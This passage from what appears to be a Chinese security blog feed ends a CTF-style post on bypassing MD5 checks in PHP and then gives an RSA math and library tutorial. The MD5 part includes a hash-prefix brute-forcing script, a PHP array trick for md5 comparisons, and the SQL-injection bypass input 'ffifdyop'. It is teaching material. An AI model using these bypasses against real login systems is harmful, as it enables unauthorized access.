class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import multiprocessing</span><br><span class="line">import hashlib</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">CHARS &#x3D; string.letters + string.digits</span><br><span class="line">def cmp_md5(substr, stop_event, str_len,. start&#x3D;0, size&#x3D;20):</span><br><span class="line">    global CHARS</span><br><span class="line">    while not stop_event.is_set():</span><br><span class="line">        rnds &#x3D; &#39;&#39;.join(random.choice(CHARS) for _ in range(size))</span><br><span class="line">        md5 &#x3D; hashlib.md5(rnds)</span><br><span class="line">        value &#x3D; md5.hexdigest()</span><br><span class="line">        if value[start: start+str_len] &#x3D;&#x3D; substr:</span><br><span class="line">            print rnds</span><br><span class="line">            stop_event.set()</span><br><span class="line">            &#39;&#39;&#39;</span><br><span class="line">            #碰撞双md5</span><br><span class="line">            md5 &#x3D; hashlib.md5(value)</span><br><span class="line">            if md5.hexdigest()[start: start+str_len] &#x3D;&#x3D; substr:</span><br><span class="line">            print rnds+ &quot;&#x3D;&gt;&quot; + value+&quot;&#x3D;&gt;&quot;+ md5.hexdigest()  + &quot;\n&quot;</span><br><span class="line">                stop_event.set()</span><br><span class="line">            &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    substr &#x3D; sys.argv[1].strip()</span><br><span class="line">    start_pos &#x3D; int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0</span><br><span class="line">    str_len &#x3D; len(substr)</span><br><span class="line">    cpus &#x3D; multiprocessing.cpu_count()</span><br><span class="line">    stop_event &#x3D; multiprocessing.Event()</span><br><span class="line">    processes &#x3D; [multiprocessing.Process(target&#x3D;cmp_md5, args&#x3D;(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 for i in range(cpus)]</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.start()</span><br><span class="line">    for p in processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></div></figure><p>上面脚本注释部分是双MD5碰撞，取消注释然后注释掉16行即可。</p><p>使用方法：python md5Crack.py “你要碰撞的字符串” 字符串的起始位置</p><p>例如：python md5Crack.py “0e” 0</p><p>将产生MD5值为0e开头的字符串。</p>        <h3 id="0x05-MD5的数组特性">          <a href="#0x05-MD5的数组特性" class="heading-link"><i class="fas fa-link"></i></a>0x05 MD5的数组特性</h3>      <p>使用php中md5的特性来绕过</p><p>md5([1,2]) == md5([3,4]) == NULL</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_GET[&#39;hash2&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !&#x3D;&#x3D; md5($_GET[&#39;hash3&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;level 2 failed&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>传入 hash2[]=1&amp;hash3=[]=2</p>        <h3 id="0x06-MD5-SQL注入绕过">          <a href="#0x06-MD5-SQL注入绕过" class="heading-link"><i class="fas fa-link"></i></a>0x06 MD5+SQL注入绕过</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; &quot;SELECT * FROM flag WHERE password &#x3D; &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;;</span><br><span class="line">$result &#x3D; $mysqli-&gt;query($query);</span><br><span class="line">$row &#x3D; $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></div></figure><p>sql注入里面的 md，平常绕过一个password</p><p>SELECT * FROM flag WHERE password = ‘ ‘ or 1=1’</p><p>那么 ’ or 后面要接上一个 为 true 的表达式</p><p>SELECT * FROM flag WHERE password = ‘“ . md5($_GET[“hash4”],true) . “‘</p><p>那么目的就明确了   md5($_GET[“hash4”],true)  这里要为 true</p><p>若我们可找到字符串，在对该字符串进行md5后能够得到  ‘or’加上一个非0的字符就可以绕过。这里我们可以用到的字符串为：<strong>ffifdyop</strong>。它的md5结果是：276f722736c95d99e921722cf9ed621c 。通过这个结果我们可以发现得到16字节的二进制被解析为字符的结果是:’or’6后面接乱码  (27是单引号的16进制编码，67是字母o的16进制…)这样后构造的sql语句就位</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop </span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621</span><br><span class="line">craw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#39;or&#39;6]!r,b</span><br></pre></td></tr></table></div></figure><p>所以：hash4=ffifdyop</p><p>参考：<span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/-mo-/p/11582424.html">https://www.cnblogs.com/-mo-/p/11582424.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密原理详解</title>
      <link href="2020/08/21/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/08/21/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="一、算法介绍">          <a href="#一、算法介绍" class="heading-link"><i class="fas fa-link"></i></a>一、算法介绍</h1>      <p><strong>一、RSA加密简介</strong><br>　　RSA加密是一种非对称加密。可以在不直接传递密钥的情况下，完成解密。这能够确保信息的安全性，避免了直接传递密钥所造成的被破解的风险。是由一对密钥来进行加解密的过程，分别称为公钥和私钥。两者之间有数学相关，该加密算法的原理就是对一极大整数做因数分解的困难性来保证安全性。通常个人保存私钥，公钥是公开的（可能同时多人持有）。</p><a id="more"></a><p><strong>二、RSA加密、签名区别</strong></p><p>　　加密和签名都是为了安全性考虑，但略有不同。常有人问加密和签名是用私钥还是公钥？其实都是对加密和签名的作用有所混淆。简单的说，加密是为了防止信息被泄露，而签名是为了防止信息被篡改。这里举2个例子说明。</p><p><strong>第一个场景</strong>：战场上，B要给A传递一条消息，内容为某一指令。</p><p>RSA的加密过程如下：</p><p>（1）A生成一对密钥（公钥和私钥），私钥不公开，A自己保留。公钥为公开的，任何人可以获取。</p><p>（2）A传递自己的公钥给B，B用A的公钥对消息进行加密。</p><p>（3）A接收到B加密的消息，利用A自己的私钥对消息进行解密。</p><p>　　在这个过程中，只有2次传递过程，第一次是A传递公钥给B，第二次是B传递加密消息给A，即使都被敌方截获，也没有危险性，因为只有A的私钥才能对消息进行解密，防止了消息内容的泄露。</p><p><strong>第二个场景：</strong>A收到B发的消息后，需要进行回复“收到”。</p><p>RSA签名的过程如下：</p><p>（1）A生成一对密钥（公钥和私钥），私钥不公开，A自己保留。公钥为公开的，任何人可以获取。</p><p>（2）A用自己的私钥对消息加签，形成签名，并将加签的消息和消息本身一起传递给B。</p><p>（3）B收到消息后，在获取A的公钥进行验签，如果验签出来的内容与消息本身一致，证明消息是A回复的。</p><p>　　在这个过程中，只有2次传递过程，第一次是A传递加签的消息和消息本身给B，第二次是B获取A的公钥，即使都被敌方截获，也没有危险性，因为只有A的私钥才能对消息进行签名，即使知道了消息内容，也无法伪造带签名的回复给B，防止了消息内容的篡改。</p><p>　　但是，综合两个场景你会发现，第一个场景虽然被截获的消息没有泄露，但是可以利用截获的公钥，将假指令进行加密，然后传递给A。第二个场景虽然截获的消息不能被篡改，但是消息的内容可以利用公钥验签来获得，并不能防止泄露。所以在实际应用中，要根据情况使用，也可以同时使用加密和签名，比如A和B都有一套自己的公钥和私钥，当A要给B发送消息时，先用B的公钥对消息加密，再对加密的消息使用A的私钥加签名，达到既不泄露也不被篡改，更能保证消息的安全性。</p><p>　　<strong>总结：公钥加密、私钥解密、私钥签名、公钥验签。</strong></p>        <h2 id="1-什么是RSA">          <a href="#1-什么是RSA" class="heading-link"><i class="fas fa-link"></i></a>1. 什么是RSA</h2>      <p>RSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语<br> 根据密钥的使用方法，可以将密码分为对称密码和公钥密码<br> 对称密码：加密和解密使用同一种密钥的方式<br> 公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。</p>        <h3 id="1-1-互质关系">          <a href="#1-1-互质关系" class="heading-link"><i class="fas fa-link"></i></a>1.1 互质关系</h3>      <p>如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/zh-cn/%E4%BA%92%E7%B4%A0">互质关系</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>（coprime）。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。</p><p>关于互质关系，不难得到以下结论：</p><blockquote><p>　　1. 任意两个质数构成互质关系，比如13和61。</p><p>　　2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</p><p>　　3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</p><p>　　4. 1和任意一个自然数是都是互质关系，比如1和99。</p><p>　　5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。</p><p>　　6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p></blockquote>        <h3 id="1-2-欧拉函数">          <a href="#1-2-欧拉函数" class="heading-link"><i class="fas fa-link"></i></a>1.2 欧拉函数</h3>      <p>请思考以下问题：</p><blockquote><p>任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？）</p></blockquote><p>计算这个值的方法就叫做<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">欧拉函数</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。</p><p>φ(n) 的计算方法并不复杂，但是为了得到最后那个公式，需要一步步讨论。 </p><p><strong>第一种情况</strong></p><p>如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。</p><p><strong>第二种情况</strong></p><p>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</p><p><strong>第三种情况</strong></p><p>如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则 </p><p>比如 φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4。</p><p>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1)个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。</p><p><strong>第四种情况</strong></p><p>如果n可以分解成两个互质的整数之积，</p><blockquote><p>　　n = p1 × p2</p></blockquote><p>则</p><blockquote><p>　　φ(n) = φ(p1p2) = φ(p1)φ(p2)</p></blockquote><p>即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p><p>这一条的证明要用到<span class="exturl"><a class="exturl__link" href="http://en.wikipedia.org/wiki/Chinese_remainder_theorem">“中国剩余定理”</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这里就不展开了，只简单说一下思路：如果a与p1互质(a&lt;p1)，b与p2互质(b&lt;p2)，c与p1p2互质(c&lt;p1p2)，则c与数对 (a,b) 是一一对应关系。由于a的值有φ(p1)种可能，b的值有φ(p2)种可能，则数对 (a,b) 有φ(p1)φ(p2)种可能，而c的值有φ(p1p2)种可能，所以φ(p1p2)就等于φ(p1)φ(p2)。</p><p><strong>第五种情况</strong></p><p>因为任意一个大于1的正整数，都可以写成一系列质数的积。</p>        <h3 id="1-3-欧拉定理">          <a href="#1-3-欧拉定理" class="heading-link"><i class="fas fa-link"></i></a>1.3 欧拉定理</h3>      <p>欧拉函数的用处，在于<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%AE%9A%E7%90%86_(%E6%95%B0%E8%AE%BA)">欧拉定理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。”欧拉定理”指的是：</p><blockquote><p>如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p></blockquote><p>也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。</p><p>欧拉定理的证明比较复杂，这里就省略了。我们只要记住它的结论就行了。</p><p>欧拉定理可以大大简化某些运算。比如，7和10互质，根据欧拉定理，</p><p>已知 φ(10) 等于4，所以马上得到7的4倍数次方的个位数肯定是1。</p><p>因此，7的任意次方的个位数（例如7的222次方），心算就可以算出来。</p><p>欧拉定理有一个特殊情况。  </p><blockquote><p>假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成</p></blockquote><p>这就是著名的<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86">费马小定理</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。它是欧拉定理的特例。</p><p>欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。</p>        <h3 id="1-4-模反元素">          <a href="#1-4-模反元素" class="heading-link"><i class="fas fa-link"></i></a>1.4 模反元素</h3>      <p>还剩下最后一个概念：</p><blockquote><p>如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。</p><p>这时，b就叫做a的<span class="exturl"><a class="exturl__link" href="http://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0">“模反元素”</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。</p></blockquote><p>比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}，即如果b是a的模反元素，则 b+kn 都是a的模反元素。</p><p>欧拉定理可以用来证明模反元素必然存在。</p><p>可以看到，a的 φ(n)-1 次方，就是a的模反元素。</p>        <h2 id="2-RSA加密">          <a href="#2-RSA加密" class="heading-link"><i class="fas fa-link"></i></a>2. RSA加密</h2>      <p>RSA的加密过程可以使用一个通式来表达</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-1a2f6947c2fc8f9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/352/format/webp" style alt="img"></p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。就这么简单？对，就是这么简单。<br> 从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说<strong>E和N的组合就是公钥</strong>，我们用(E,N)来表示公钥</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-7017df85daaa0d5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/327/format/webp" style alt="img"></p><p>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母</p>        <h2 id="3-RSA解密">          <a href="#3-RSA解密" class="heading-link"><i class="fas fa-link"></i></a>3. RSA解密</h2>      <p>RSA的解密同样可以使用一个通式来表达</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-e2b53cccd699aff1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/318/format/webp" style alt="img"></p><p>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥</p><p><img src="https://upload-images.jianshu.io/upload_images/3274507-3e379a1e8ed76d9a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/282/format/webp" style alt="img"></p><p>从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”<br> 此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p><p>小结下</p><div class="table-container"><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">公钥</td><td align="center">（E，N）</td></tr><tr><td align="center">私钥</td><td align="center">（D，N）</td></tr><tr><td align="center">密钥对</td><td align="center">（E，D，N）</td></tr></tbody></table></div><p>此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p>        <h2 id="4-生成密钥对">          <a href="#4-生成密钥对" class="heading-link"><i class="fas fa-link"></i></a>4. 生成密钥对</h2>      <p>既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？步骤如下：</p><ol><li>求N</li><li>求L（L为中间过程的中间数）</li><li>求E</li><li>求D</li></ol>        <h3 id="4-1-求N">          <a href="#4-1-求N" class="heading-link"><i class="fas fa-link"></i></a>4.1 求N</h3>      <p>准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N</p><blockquote>        <h4 id="N-p-q">          <a href="#N-p-q" class="heading-link"><i class="fas fa-link"></i></a>N = p * q</h4>      </blockquote>        <h3 id="4-2-求L">          <a href="#4-2-求L" class="heading-link"><i class="fas fa-link"></i></a>4.2 求L</h3>      <p>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示</p><blockquote>        <h4 id="L-lcm（p－1，q－1）">          <a href="#L-lcm（p－1，q－1）" class="heading-link"><i class="fas fa-link"></i></a>L=lcm（p－1，q－1）</h4>      </blockquote>        <h3 id="4-3-求E">          <a href="#4-3-求E" class="heading-link"><i class="fas fa-link"></i></a>4.3 求E</h3>      <p>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1<br> 用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p><blockquote>        <h4 id="1-lt-E-lt-L">          <a href="#1-lt-E-lt-L" class="heading-link"><i class="fas fa-link"></i></a>1 &lt; E &lt; L</h4>              <h4 id="gcd（E，L）-1">          <a href="#gcd（E，L）-1" class="heading-link"><i class="fas fa-link"></i></a>gcd（E，L）=1</h4>      </blockquote><p>之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。</p>        <h3 id="4-4-求D">          <a href="#4-4-求D" class="heading-link"><i class="fas fa-link"></i></a>4.4 求D</h3>      <p>数D是由数E计算出来的，D与L互质。D、E和L之间必须满足以下关系：</p><blockquote>        <h4 id="1-lt-D-lt-L">          <a href="#1-lt-D-lt-L" class="heading-link"><i class="fas fa-link"></i></a>1 &lt; D &lt; L</h4>              <h4 id="E＊D-mod-L-＝-1">          <a href="#E＊D-mod-L-＝-1" class="heading-link"><i class="fas fa-link"></i></a>E＊D mod L ＝ 1</h4>              <h3 id="D-gmpy2-invert-E-L">          <a href="#D-gmpy2-invert-E-L" class="heading-link"><i class="fas fa-link"></i></a>D=gmpy2.invert(E,L)</h3>      </blockquote><p>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。<br> 简单地说条件2是为了保证密文解密后的数据就是明文。<br> 现在私钥自然也已经生成了，密钥对也就自然生成了。<br> 小结下：</p><div class="table-container"><table><thead><tr><th align="center"></th><th align="center"></th></tr></thead><tbody><tr><td align="center">求N</td><td align="center">N＝ p ＊ q ；p，q为质数</td></tr><tr><td align="center">求L</td><td align="center">L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数</td></tr><tr><td align="center">求E</td><td align="center">1 &lt; E &lt; L，gcd（E，L）=1；E，L最大公约数为1（E和L互质）</td></tr><tr><td align="center">求D</td><td align="center">1 &lt; D &lt; L，E＊D mod L ＝ 1</td></tr></tbody></table></div>        <h3 id="4-5-加密">          <a href="#4-5-加密" class="heading-link"><i class="fas fa-link"></i></a>4.5 加密</h3>      <p><strong>密文＝明文^E mod N</strong></p><p><strong>C=M^E mod N</strong></p><p><strong>C=pow(M,E,N)</strong></p>        <h3 id="4-6-解密">          <a href="#4-6-解密" class="heading-link"><i class="fas fa-link"></i></a>4.6 解密</h3>      <p><strong>明文＝密文^D mod N</strong></p><p><strong>M=C^D mod N</strong></p><p><strong>M=pow(C,D,N)</strong></p>        <h1 id="二，RSA-解密常用库和函数">          <a href="#二，RSA-解密常用库和函数" class="heading-link"><i class="fas fa-link"></i></a>二，RSA 解密常用库和函数</h1>              <h2 id="1-gmpy2-库">          <a href="#1-gmpy2-库" class="heading-link"><i class="fas fa-link"></i></a>1. gmpy2 库</h2>              <h3 id="1-1-gmpy2-mpz-x">          <a href="#1-1-gmpy2-mpz-x" class="heading-link"><i class="fas fa-link"></i></a>1.1  gmpy2.mpz(x)</h3>      <p>初始化一个大整数x</p>        <h3 id="1-2-gmpy2-mpfr-x">          <a href="#1-2-gmpy2-mpfr-x" class="heading-link"><i class="fas fa-link"></i></a>1.2 gmpy2.mpfr(x)</h3>      <p>初始化一个高精度浮点数x</p>        <h3 id="1-3-C-gmpy2-powmod-M-e-n">          <a href="#1-3-C-gmpy2-powmod-M-e-n" class="heading-link"><i class="fas fa-link"></i></a>1.3 C = gmpy2.powmod(M,e,n)</h3>      <p>幂取模，结果是 C = (M^e) mod n</p>        <h3 id="1-4-d-gmpy2-invert-e-L">          <a href="#1-4-d-gmpy2-invert-e-L" class="heading-link"><i class="fas fa-link"></i></a>1.4 d = gmpy2.invert(e,L)</h3>      <p>求逆元，de = 1 mod L（D和L互质，D和E互为逆元）</p>        <h3 id="1-5-gmpy2-is-prime-n">          <a href="#1-5-gmpy2-is-prime-n" class="heading-link"><i class="fas fa-link"></i></a>1.5 gmpy2.is_prime(n)</h3>      <p>判断n是不是素数</p>        <h3 id="1-6-gmpy2-gcd-a-b">          <a href="#1-6-gmpy2-gcd-a-b" class="heading-link"><i class="fas fa-link"></i></a>1.6 gmpy2.gcd(a,b)</h3>      <p>欧几里得算法，最大公约数</p>        <h3 id="1-7-gmpy2-gcdext-a-b">          <a href="#1-7-gmpy2-gcdext-a-b" class="heading-link"><i class="fas fa-link"></i></a>1.7 gmpy2.gcdext(a,b)</h3>      <p>扩展欧几里得算法</p>        <h3 id="1-8-gmpy2-iroot-x-n">          <a href="#1-8-gmpy2-iroot-x-n" class="heading-link"><i class="fas fa-link"></i></a>1.8 gmpy2.iroot(x,n)</h3>      <p>x开n次根</p>        <h2 id="2-libnum-库">          <a href="#2-libnum-库" class="heading-link"><i class="fas fa-link"></i></a>2. libnum 库</h2>              <h3 id="2-1-libnum-s2n-s">          <a href="#2-1-libnum-s2n-s" class="heading-link"><i class="fas fa-link"></i></a>2.1 libnum.s2n(s)</h3>      <p>字符串转换为数字。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">&quot;ab12&quot;</span></span><br><span class="line">print(libnum.s2n(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1633825074</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-2-libnum-s2n-n">          <a href="#2-2-libnum-s2n-n" class="heading-link"><i class="fas fa-link"></i></a>2.2 libnum.s2n(n)</h3>      <p>数字转换为字符串。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = <span class="number">1633825074</span></span><br><span class="line">print(libnum.n2s(n))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-3-libnum-s2b-s">          <a href="#2-3-libnum-s2b-s" class="heading-link"><i class="fas fa-link"></i></a>2.3 libnum.s2b(s)</h3>      <p>字符串转换为二进制字符串。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">s = <span class="string">&quot;ab12&quot;</span></span><br><span class="line">print(libnum.s2b(s))</span><br><span class="line"></span><br><span class="line">result: <span class="number">01100001011000100011000100110010</span></span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-4-libnum-b2s-b">          <a href="#2-4-libnum-b2s-b" class="heading-link"><i class="fas fa-link"></i></a>2.4 libnum.b2s(b)</h3>      <p>二进制字符串转换为字符串。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">b = <span class="string">&quot;01100001011000100011000100110010&quot;</span></span><br><span class="line">print(libnum.b2s(b))</span><br><span class="line"></span><br><span class="line">result: ab12</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-5-Primes">          <a href="#2-5-Primes" class="heading-link"><i class="fas fa-link"></i></a>2.5 Primes</h3>              <h4 id="2-5-1-libnum-primes-n">          <a href="#2-5-1-libnum-primes-n" class="heading-link"><i class="fas fa-link"></i></a>2.5.1 libnum.primes(n)</h4>      <p>返回不大于n的素数列表。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.primes(<span class="number">19</span>))</span><br><span class="line"></span><br><span class="line">result: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">19</span>]</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></div></figure>        <h4 id="2-5-2-libnum-generate-prime-n">          <a href="#2-5-2-libnum-generate-prime-n" class="heading-link"><i class="fas fa-link"></i></a>2.5.2 libnum.generate_prime(n)</h4>      <p>产生长度为n位的伪素数。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.generate_prime(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">result: <span class="number">1021</span></span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></div></figure>        <h3 id="2-6-其它">          <a href="#2-6-其它" class="heading-link"><i class="fas fa-link"></i></a>2.6 其它</h3>              <h4 id="2-6-1-libnum-factorize-n">          <a href="#2-6-1-libnum-factorize-n" class="heading-link"><i class="fas fa-link"></i></a>2.6.1 libnum.factorize(n)</h4>      <p>返回n的所有素因子及每个素因子的个数。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">print(libnum.factorize(<span class="number">60</span>))</span><br><span class="line"></span><br><span class="line">result: &#123;<span class="number">2</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">1</span>, <span class="number">5</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></div></figure>        <h4 id="2-6-2-libnum-modular-invmod-e-m">          <a href="#2-6-2-libnum-modular-invmod-e-m" class="heading-link"><i 